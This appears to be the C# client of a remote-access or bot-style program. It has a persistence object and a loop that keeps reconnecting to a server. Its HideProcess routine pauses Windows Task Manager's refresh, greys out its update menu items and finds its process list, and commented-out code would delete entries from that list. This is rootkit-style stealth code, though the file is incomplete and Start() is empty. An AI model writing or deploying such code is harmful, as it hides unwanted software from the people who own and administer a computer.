using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using Client.API;

namespace Client
{
    class Program
    {
        private static  Persistence  _Persistence = new Persistence();
        private static  LocalMachine _ThisPC = new LocalMachine();
        private static  Server       _Server = new Server();

        static void Main(string[] args)
        {
            Init();
            CheckMachineStates();

            HideProcess();

            //DKOM.ProcessChain = System.Diagnostics.Process.GetProcesses().ToList();
            //var result = DKOM.FindWindow(null, "Untitled - Notepad");


            Console.WriteLine("--");

            do
            {
                // If we are offline.
                while (_ThisPC.Status == LocalMachine.State.OFFLINE)
                {
                    _ThisPC.Reconnect();
                }

                // If we are online, but the server is unreachable.
                while (_Server.Status == Server.State.OFFLINE && _ThisPC.Status == LocalMachine.State.ONLINE)
                {
                    _Server.Probe();
                }

                while (_ThisPC.Status == LocalMachine.State.ONLINE && _Server.Status == Server.State.ONLINE)
                {
                    CheckMachineStates();
                    Start();
                }

                Thread.Sleep(1000);
            } while (true);
        }

        private static void Init()
        {
            // Set predefined config here.
            Logger.IsEnabled = true;

            string logging = Logger.IsEnabled ? "ON" : "OFF";
            Console.WriteLine("[{0}] Logging\n", logging);
 
        }

        private static void Start()
        {
        }

        private static void CheckMachineStates()
        {
            _ThisPC.Reconnect();
            _Server.Probe();
        }

        private static void HideProcess()
        {
            List<Process> procList = System.Diagnostics.Process.GetProcesses().ToList();

            IntPtr lhWndParent = DKOM.FindWindow(null, "Task Manager");
            Console.WriteLine("Handle:\t" + lhWndParent + " - " + lhWndParent.ToString("X"));

            IntPtr lhWndDialog = new IntPtr(),
                lhWndProcessList = new IntPtr(),
                lhWndProcessHeader = new IntPtr();

            // Get Task manager menus
            IntPtr hMenu = DKOM.GetMenu(lhWndParent);
            IntPtr hSubMenu = DKOM.GetSubMenu(hMenu, 2);
            IntPtr hSubSubMenu = DKOM.GetSubMenu(hSubMenu, 1);

            Console.WriteLine("'View' Menu:\t" + hMenu + "\t- " + hMenu.ToString("X") +
                              "\n'RefreshSpeed' Menu:\t" + hSubMenu + "\t- " + hSubMenu.ToString("X") + 
                              "\n'Speed' Menu:\t" + hSubSubMenu + "\t- " + hSubSubMenu.ToString("X"));
            
            // Refresh now button
            Int32 refreshNowButton = DKOM.GetMenuItemID(hSubMenu, 0);

            // Menu items
            List<Int32> updateNowList = new List<int>()
            {
                DKOM.GetMenuItemID(hSubSubMenu, 0),
                DKOM.GetMenuItemID(hSubSubMenu, 1),
                DKOM.GetMenuItemID(hSubSubMenu, 2),
                DKOM.GetMenuItemID(hSubSubMenu, 3)
            };

            Console.WriteLine("Pause:\t" + updateNowList[3] + "\t- " + updateNowList[3].ToString("X"));
            
            //Force clicking of the pause
            DKOM.PostMessage(lhWndParent, DKOM.WM_COMMAND, updateNowList[3] , 0);

            foreach (Int32 button in updateNowList)
            {
                DKOM.EnableMenuItem(hMenu, (uint)button, DKOM.MF_GRAYED);
            }
            DKOM.EnableMenuItem(hMenu, (uint)refreshNowButton, DKOM.MF_ENABLED);

            IntPtr uiInner = new IntPtr();
            lhWndDialog = DKOM.FindWindowEx(lhWndParent, lhWndDialog, null, null);
            uiInner = DKOM.FindWindowEx(lhWndDialog, uiInner, null, null);

            // Step through the task manager inner windows looking for the process lists
            for (int i = 0; i < 7; i++)
            {

                lhWndProcessList = DKOM.FindWindowEx(uiInner, lhWndProcessList, null , null);
                Console.WriteLine("Searching class: " + lhWndProcessList.ToString("X"));
                
                if (DKOM.FindWindowEx(lhWndProcessList, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
                {
                    Console.WriteLine(" ^ HIT.");
                    lhWndProcessList = DKOM.FindWindowEx(lhWndProcessList, IntPtr.Zero, "SysListView32", null);
                    lhWndProcessHeader = DKOM.FindWindowEx(lhWndProcessList, IntPtr.Zero, "SysHeader32", null);
                    break;
                }
            }

            
            //DKOM.PostMessage(lhWndProcessList, 0x1075, 0, req);


            //Not sure if this does anything.

            //DKOM.LockWindowUpdate(lhWndProcessList);
            //DKOM.PostMessage(lhWndProcessList, DKOM.LVM_SORTITEMS, 0, 0);
           // DKOM.LockWindowUpdate(IntPtr.Zero);
/*            for (int i = 0; i < procList.Count - 1; i++)
            {
                DKOM.PostMessage(lhWndProcessList, DKOM.LVM_DELETEITEM, i, 0);
            }
            */

            Console.WriteLine("Inner Menu: " + lhWndDialog + " - " + lhWndDialog.ToString("X") + "\nuiInner: " + uiInner + " - " + uiInner.ToString("X")
                + " \nlhWndProcessList: " + lhWndProcessList + " - " + lhWndProcessList.ToString("X") + "\nlhWndProcessHeader: " + lhWndProcessHeader + " - " + lhWndProcessHeader.ToString("X"));

        }

    }
}
